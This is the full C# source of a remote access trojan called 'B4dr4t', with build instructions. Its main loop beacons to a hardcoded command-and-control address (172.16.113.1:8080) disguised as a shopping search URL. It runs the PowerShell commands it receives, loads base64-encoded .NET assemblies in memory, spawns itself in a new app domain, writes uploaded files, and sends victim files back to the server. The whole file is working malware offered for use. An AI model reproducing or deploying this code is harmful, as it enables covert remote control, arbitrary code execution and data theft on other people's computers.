﻿using System;
using System.Linq;
using System.Text;
using System.Threading;
using System.Reflection;
using System.IO;
using System.Security.Principal;
using System.Net.Http;
using Newtonsoft.Json.Linq;
using System.Collections.ObjectModel;
using System.Management.Automation;

// Make sure to include the Powershell DLL file as a reference before compiling this project.
// Copy System.Management.Automation.dll to your C: drive with the following Powershell command: copy ([psobject].Assembly.Location) C:\
// Add the reference in visual studio: Project > Add Reference > Browse > System.Management.Automation.dll

//You also need to install the Newtonsoft.Json package from the NuGet package manager included with visual studio
namespace B4dr4t
{
    public class Program
    {
        readonly static string id = new Random().Next().ToString();
        readonly static string un = WindowsIdentity.GetCurrent().Name.Split('\\')[1];
        readonly static string type = "c#";
        readonly static int sleepytime = 3000;

        // By passing in the same Powershell object we share the same Powershell workspace as standard cmd execution
        private static string RunPs(string encodedScript, PowerShell ps)
        {
            string results = string.Empty;
            string script = Encoding.UTF8.GetString(Convert.FromBase64String(encodedScript));
            var output = ps.AddScript(script).Invoke();
            foreach (PSObject item in output)
            {
                results += item.ToString() + "\n";
            }
            return results;
        }

        // Runs the current assembly Main() in new app domain and has no parameters so it can be easily called via threads
        private static void Spawn()
        {
            Assembly assembly = Assembly.GetEntryAssembly();
            AppDomain appDomain = AppDomain.CreateDomain(id);
            appDomain.Load(assembly.FullName);
            appDomain.ExecuteAssemblyByName(assembly.FullName);
        }
        //Most of this function is copied from C Sharper: https://gitlab.com/KevinJClark/csharper
        private static string RunAssembly(string encodedAssembly, string argumentString)
        {
            string Delimeter = "\",\""; // split on quote comma quote ( "," )
            argumentString = argumentString.Trim('"'); //Remove leading and trailing quotes
            string[] assemblyArgs = argumentString.Split(new[] { Delimeter }, StringSplitOptions.None);
            bool foundMain = false;
            bool execMain = false;
            Assembly assembly = null;

            try
            {
                byte[] data = Convert.FromBase64String(encodedAssembly);
                assembly = Assembly.Load(data);
            }
            catch (Exception e)
            {
                return "[!] Could not load assembly. Error caught:\n" + e.ToString();
            }

            // Get all types in the assembly
            Type[] types = assembly.GetExportedTypes();

            // Run through each type (aka class), finding methods contained within
            foreach (Type type in types)
            {
                // Get all methods in the type
                MethodInfo[] methods = type.GetMethods();

                // Run through each method, searching for Main method (aka function)
                foreach (MethodInfo method in methods)
                {
                    if (method.Name == "Main")
                    {
                        foundMain = true;
                        if (!type.Attributes.HasFlag(TypeAttributes.Abstract))
                        {
                            execMain = true;

                            //Redirect output from C# assembly (such as Console.WriteLine()) to a variable instead of screen
                            TextWriter prevConOut = Console.Out;
                            var sw = new StringWriter();
                            Console.SetOut(sw);

                            object instance = Activator.CreateInstance(type);
                            // https://stackoverflow.com/questions/3721782/parameter-count-mismatch-with-invoke
                            var output = method.Invoke(instance, new object[] { assemblyArgs }); // Runs the main function with args

                            //Restore output -- Stops redirecting output
                            Console.SetOut(prevConOut);
                            output = sw.ToString();

                            return (string)output;
                        }
                    }
                }
            }
            if (!foundMain)
            {
                return "[!] No public \"Main()\" function found in assembly. Did you make sure to set the class as public?";
            }
            else if (!execMain)
            {
                return "[!] Found public \"Main()\" function but could not execute it. Make your assembly's CPU arch matches this program.";
            }
            else
            {
                return "[!] Unexpected error occured";
            }

        }
        public static void Main(string[] args)
        {
            string home;
            string uri;
            string host;
            string retval = string.Empty;
            byte[] retdata = null;
            string rettype;
            string cmnd;

            if (args.Length == 0)
            {
                host = "http://172.16.113.1:8080";
                uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
                home = host + uri;
            }
            else
            {
                home = args[1];
            }

            HttpClient client = new HttpClient();
            PowerShell ps = PowerShell.Create();
            Collection<PSObject> output = null;
            JObject jsObject = new JObject();

            while (true)
            {
                try
                {
                    string resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\"}";
                    HttpResponseMessage postResults = client.PostAsync(home, new StringContent(resp)).Result;

                    string serverMsg = postResults.Content.ReadAsStringAsync().Result;
                    string jString = "{" + serverMsg.Split('{')[1].Split('\n')[0];
                    jsObject = JObject.Parse(jString);

                    // If cmnd is not empty string ("")
                    if (jsObject["cmnd"].ToString() != "")
                    {
                        cmnd = jsObject["cmnd"].ToString();
                        rettype = "retval";

                        if (cmnd == "quit")
                        {
                            return;
                        }
                        else if (cmnd == "spawn")
                        {
                            //Executes the Spawn function in a new thread (not process)
                            try
                            {
                                ThreadStart x = new ThreadStart(Spawn);
                                Thread t = new Thread(x);
                                t.Start();
                                retval = "[+] Spawn success...";
                            }
                            catch
                            {
                                retval = "[-] Spawn failed...";
                            }

                        }
                        else if (cmnd.Split(' ')[0] == "psh")
                        {
                            //Run encoded powershell sent from the server
                            string encodedScript = cmnd.Split(' ')[1];
                            retval = RunPs(encodedScript, ps);
                        }
                        else if (cmnd.Split(' ')[0] == "cs")
                        {
                            //Run a C Sharp executable (aka assembly)
                            //cs <base64_encoded_assembly> "arg1","arg2","third arg"
                            string b64Assembly = cmnd.Split(' ')[1];
                            //Cuts off the first two elements of cmnd (cs and <b64assembly>) and returns a string array
                            string argumentString = string.Join(" ", cmnd.Split(' ').Skip(2).Take(cmnd.Length).ToArray()); //Equiv to args = " ".join(cmnd.split(" ")[2:])
                            retval = RunAssembly(b64Assembly, argumentString);

                        }
                        else if (cmnd.Split(' ')[0] == "dl")
                        {
                            //Download a file -- Send a file from the rat to the server
                            string filename = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
                            filename = Path.GetFullPath(filename);
                            try
                            {
                                retdata = File.ReadAllBytes(filename);
                                rettype = "dl";
                            }
                            catch
                            {
                                rettype = "retval";
                                retval = "[-] Could not read file " + filename;
                            }
                        }
                        else if (cmnd.Split(' ')[0] == "up")
                        {
                            //Upload a file -- Send a file from the server to the rat
                            string filename = string.Join(" ", cmnd.Split(' ').Skip(2).Take(cmnd.Length).ToArray());
                            filename = Path.GetFullPath(filename);
                            try
                            {
                                byte[] content = Convert.FromBase64String(cmnd.Split(' ')[1]);

                                File.WriteAllBytes(filename, content);
                                retval = "[+] File uploaded: " + filename;
                            }
                            catch
                            {
                                retval = "[-] Could not write file " + filename;
                            }
                        }
                        else // Execute (Power)shell command
                        {
                            if(cmnd.StartsWith("cd "))
                            {
                                // Change directories in C# when we CD in shell to keep C# and PS pwd the same
                                try
                                {
                                    var directory = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
                                    Directory.SetCurrentDirectory(directory);
                                }
                                catch
                                {
                                    //pass
                                }
                            }
                            output = ps.AddScript(cmnd).Invoke();
                            foreach (PSObject item in output)
                            {
                                retval += item.ToString() + "\n";
                            }
                        }

                        // Should just replace with a function that returns a base64 encoded string based off of typeof() but whatever
                        if (rettype == "dl")
                        {
                            resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(retdata) + "\"}";
                        }
                        else
                        {
                            if (retval == "")
                            {
                                retval = "[*] No output returned";
                            }
                            resp = "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(retval)) + "\"}";
                        }
                        retval = string.Empty;
                        postResults = client.PostAsync(home, new StringContent(resp)).Result;
                    }
                    Thread.Sleep(sleepytime);
                }
                catch
                {
                    Thread.Sleep(sleepytime);
                }
            }
        }
    }
}

